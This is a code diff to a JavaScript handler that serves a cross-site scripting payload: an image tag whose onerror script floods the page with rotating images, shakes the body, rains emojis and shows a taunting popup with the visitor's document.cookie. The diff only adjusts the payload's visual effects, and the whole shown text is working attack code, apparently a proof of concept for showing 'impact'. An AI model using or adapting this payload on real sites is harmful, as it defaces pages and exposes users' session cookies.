@@ -18,31 +18,40 @@ export default function handler(req, res) {
 <img src=x onerror="
 (function(){
 
-  // === MORE poggers ===
+  // === Poggers constrained to viewport ===
   const imgUrl = 'https://i.imgur.com/dortPBR.png';
-  for (let i = 0; i < 15; i++) { // increased from 6 → 15
+  const SIZE = 90;
+
+  for (let i = 0; i < 15; i++) {
     let img = document.createElement('img');
     img.src = imgUrl;
     img.style.position = 'fixed';
-    img.style.width = '150px';
+    img.style.width = SIZE + 'px';
     img.style.zIndex = 999999;
-    img.style.top = Math.random()*95 + '%';
-    img.style.left = Math.random()*95 + '%';
-    img.style.transition = 'all 3s linear';
+    img.style.transition = 'all 2.5s linear';
     document.body.appendChild(img);
 
-    setInterval(() => {
-      img.style.top = Math.random()*95 + '%';
-      img.style.left = Math.random()*95 + '%';
+    function move() {
+      const maxX = window.innerWidth - SIZE;
+      const maxY = window.innerHeight - SIZE;
+
+      const x = Math.random() * maxX;
+      const y = Math.random() * maxY;
+
+      img.style.left = x + 'px';
+      img.style.top = y + 'px';
       img.style.transform = 'rotate(' + Math.random()*360 + 'deg)';
-    }, 3000);
+    }
+
+    move();
+    setInterval(move, 2500);
   }
 
-  // === FIXED TOP popup (always visible) ===
+  // === Popup below navbar ===
   let popup = document.createElement('div');
   popup.innerText = 'ENOUGH IMPACT FOR YOU BRO?\\n\\n🍪 ' + document.cookie;
   popup.style.position = 'fixed';
-  popup.style.top = '80px'; // pinned to top
+  popup.style.top = '150px';
   popup.style.left = '50%';
   popup.style.transform = 'translateX(-50%)';
   popup.style.background = 'black';
@@ -56,12 +65,12 @@ export default function handler(req, res) {
   popup.style.wordBreak = 'break-all';
   document.body.appendChild(popup);
 
-  // === MUCH softer shake ===
+  // === Softer shake ===
   setInterval(() => {
     document.body.style.transform = 'rotate(' + (Math.random()*0.3 - 0.15) + 'deg)';
   }, 400);
 
-  // === Emoji rain (slightly reduced spam) ===
+  // === Emoji rain ===
   setInterval(() => {
     let e = document.createElement('div');
     e.innerText = '💀🔥😂';
